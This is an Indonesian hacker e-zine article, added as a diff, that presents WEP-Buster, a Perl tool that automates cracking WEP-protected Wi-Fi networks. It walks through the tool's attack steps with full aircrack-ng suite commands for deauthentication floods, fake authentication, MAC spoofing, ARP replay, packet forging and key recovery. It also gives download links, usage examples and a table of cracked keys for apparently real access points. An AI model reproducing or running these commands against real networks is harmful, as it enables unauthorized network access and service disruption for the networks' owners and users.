@@ -1,0 +1,176 @@
+                 .::                         .:                   
+   .::       .:::.::        .::    .:::: .::   .:: .::     .::    
+ .:   .::  .::   .: .:    .::  .::      .:: .:: .::  .:: .:   .:: 
+.::::: .::.::    .::  .::.::    .::   .::   .:: .::  .::.::::: .::
+.:         .::   .:   .:: .::  .::   .::    .:: .::  .::.:        
+  .::::      .:::.::  .::   .::    .::::::::.::.:::  .::  .::::   
+  
+ECHO MAGAZINE VOLUME VII, ISSUE XXI, PHILE 0x009.TXT
+
+HACKER LOGBOOK: WEP-Buster : WEP Cracking Automator
+Ditulis oleh: lirva32, lirva32@echo.or.id
+
+
+===// Pendahuluan \\===
+
+Mungkin kita tidak asing lagi dengan WEP pada keamanan jaringan wireless.  
+WEP (Wired Equivalent Privacy) merupakan sebuah standar keamanan jaringan 
+nirkabel. Standar ini memiliki kelemahan-kelemahan dan kemudian digantikan 
+dengan Wi-Fi Protected Access (WPA). Walau memiliki kelemahan-kelemahan, 
+WEP masih tetap digunakan secara luas dikarenakan sangat simple dan tidak 
+membebani Access Point ketika melakukan proses deenkripsi. WEP-Buster 
+merupakan salah satu teknik untuk melakukan proses cracking terhadap keamanan 
+jaringan wireless yang terproteksi dengan standart WEP. WEP-Buster akan 
+melakukan cracking WEP terhadap semua channel yang terditeksi 
+oleh Wireless Card.
+
+
+===// Kebutuhan \\===
+[.] aircrack-ng 1.0 rc4 and above 
+[.] perl installation with standard libraries (threading support)  
+    perl module : 
+    - Term::ReadKey	
+    - Expect.pm 
+[.] - macchanger (www.alobbs.com/macchanger)
+[.] unix programs : ifconfig, iwconfig, rm, pkill, stty, cp, touch, 
+    mv, route, ping, dhclient, netstat
+[.] Wifi Interface, dalam uji coba ini penulis mempergunakan WiFi : 
+    Edimax EW-7318USg, AirLive-WL1600USB, AirLive-WN360USB.
+
+
+===// Pseudocode WepBuster \\===
+
+[1]  Wepbuster akan menjalankan "airmon-ng" dan merubah WiFi interface 
+     yang kita gunakan ke fungsi "monitor mode"
+[2]  Proses "parsing" dilakukan terhadap MAC Address oleh ifconfig output
+[3]  Wepbuster akan menangkap parameter dan argument yang dikirimkan berupa 
+     channel yang akan dilakukan proses "cracking"
+[4]  Wepbuster akan melakukan verifikasi terhadap AP yang akan dicracking
+[5]  Wepbuster akan melakukan pengecekan terhadap channel AP untuk memastikan 
+     waktu yang dibutuhkan untuk melakukan cracking serta secara keseluruhan 
+     melakukan perincian seluruh AP yang mempergunakan keamanan WEP, Jika 
+     keamanan yang dipergunakan bukan WEP maka akan dilewati dari proses ini.
+
+     Intinya WepBuster menjalankan : " airodump-ng monitor_interface -t wep -c  channel -n -w $filename 2>&1 " 
+[6]  Jika AP mempergunakan WEP, maka akan dilakukan proses cracking, dengan 
+     metode sbb :
+     [6.a] Mode Cracking : mode pemecahan WEP yang dilakukan terhadap "Bad AP" 
+           ataupu "Known AP"
+     [6.b] Reveled SSID  : mode pemecahan SSID yang di Hidden | Suppressed 
+           dengan cara mengirimkan deauth broadcast, dengan menjalankan 
+           " aireplay-ng -0 1 -a bssid inject_interface -h mac_address 2>&1 "
+           
+           Jika banyak client yang sudah berasosiasi dengan AP target maka, 
+            akan dijalankan :
+           " `aireplay-ng -0 1 -a bssid inject_interface -h mac_address -c client_macaddress 2>&1 "
+           Sayangnya, tidak semua SSID bisa berhasil dimunculkan.
+
+[7]  WepBuster akan mengecek apakah AP mempergunakan "MAC Address Filtering" 
+     dan juga mempergunakan "Shared Key Auth"
+     . Jika ada "MAC Address Filtering" ataupun juga "Shared Key Auth", 
+       maka WepBuster akan melakukan FakeAuth dengan menjalankan perintah : 
+       " aireplay-ng -1 1 -a bssid inject_interface -e 'ssid' -h mac_address -D 2>&1 "
+     . Jika terdapat "MAC Address Filtering" maka WepBuster akan melakukan 
+       "Spoofing MAC" terhadap client yang dapat berasosiasi dengan AP.
+     . Jika spoofing MAC Address berhasil maka aplikasi MAC Changer akan 
+       menggantikan MAC Address kita dengan MAC Address yang sudah didapatkan.
+
+[8]  WebBuster tetap akan menjalankan FakeAuth dengan selalu melakukan 
+     re-asosiasi setiap 15 menit sekali, dengan menjalankan perintah : 
+
+     " aireplay-ng -1 900 -o 1 -q 10 -a bssid inject_interface -e 'ssid' -h mac_address "
+
+[9]  WepBuster tetap menjalankan airodump sebagai background proses untuk 
+     mengumpulkan data dari AP yang menjadi target, dengan menjalankan :
+
+     "airodump-ng monitor_interface -t wep -u 20 -d bssid -c channel --output-format pcap,csv -w inject_dump  2>&1 "
+
+[10] WepBuster tetap menjalankan arp attack sebagai background proses, 
+     dengan menjalankan :
+     
+     " aireplay-ng inject_interface -3  -b bssid -h mac_address 2>&1 "
+
+[11] WepBuster tetap akan mengumpulkan IV dengan selalu mengirimkan 
+     deaunth broadcast selama IV yang ditargetkan belum  tercapai. 
+     dengan menjalankan perintah :
+     
+     " aireplay-ng -0 1 -a bssid inject_interface -h mac_address "
+
+     serta menjalankan :
+
+     " aireplay-ng -5 inject_interface -b bssid -r inject_dump-01.cap.tmp -h mac_address "
+
+[12] Jika Proces attack berhasil maka Wepbuster akan membuatkan sebuah arp 
+     packet dengan memanfaatkan keystream yang ada, dengan 
+     menjalankan perintah :
+     
+     " packetforge-ng -0 -a bssid -h mac_address -k 255.255.255.255 -l 255.255.255.255 -y keystream_xor -w forged_arp.cap "
+
+[13] Wep Buster pun kemudian menjalankan perintah :
+     " aireplay-ng inject_interface -3 -r forged_arp.cap -b bssid -h mac_address 2>&1 "
+     
+[14] Jika terdapat fragmentasi data maka WepBuster akan malakukan rebroadcast 
+     attack (-p 0841), dengan menjalankan perintah :
+     
+     " aireplay-ng inject_interface -2 -p 0841 -b bssid -c FF:FF:FF:FF:FF:FF -h mac_address  2>&1 "
+
+[15] WepBuster akan melakukan Pemecahan Key, dengan prosesi :
+     .  Jika minimal IV yang dikumpulkan sudah mencapai 17000 maka akan 
+        dimulai pemecahan key, dengan menjalankan perintah :
+        " aircrack-ng -q -b 'bssid' inject_dump-01.cap "
+     .  Hasil cracking akan masuk kedalam sebiah file : owned.txt
+     .  Jika key tidak dapat dipecahkan selama 15 menit maka AP yang menjadi 
+        target akan ditinggalkan
+
+[16] selesai sudah bagian umum dan terpenting dari perjalanan WepBuster.
+
+
+===// Script download \\===
+http://code.google.com/p/wepbuster 
+http://lirva32.org/download/wepbuster-1.0_beta.rar
+
+
+===// Menjalankan Script \\===
+#  perl wepbuster [channel/s] 	 	
+#  perl wepbuster (sort | connect) [HOST | IP]
+
+
+contoh penggunaan :
+
+#  perl wepbuster
+   --- akan melakukan cracking wep semua channel yang terditeksi oleh wifi Anda.
+
+#  perl wepbuster 11/s
+   --- akan melakukan cracking wep semua Ap yang mempergunakan chanell 11.
+
+
+
+===// Hasil Cracking \\===
+
++------------------------------------------------------------------------------+
+| BSSID              CHANNEL        SSID	      KEY	 TIMESTAMP     |
++------------------------------------------------------------------------------+						 
+|  00:21:29:7D:5E:EB === 11 ===  CafeMandiri === 08:6D:38:15:30 === 1243883642 |        
+|  00:12:29:1D:E1:B3 === 10 ===  linksys     === 68:28:1a:3c:20 === 1243883642 |         
++-------------------------------------------------------------------------------+
+
+
+===// Referensi \\=== 
+
+. Project Page: http://code.google.com/p/wepbuster 	
+. Demo Videos: http://www.youtube.com/user/wif1bust3r
+
+
+===// Greetz \\===
+
+[1] echo|staff, newbie hacker
+[2] Anakku : Faiza Debian dan Fivana Gutsy
+[3] AllMyFriends : Flexus, S4kitJiw4, dll deh... ;)
+[4] stmik_bina_insani_bekasi
+[5] MyAlamamater : FTI_UBL
+[6] semua teman2 yang tidak aku sebutkan satu persatu.
+
+
+
+
+		
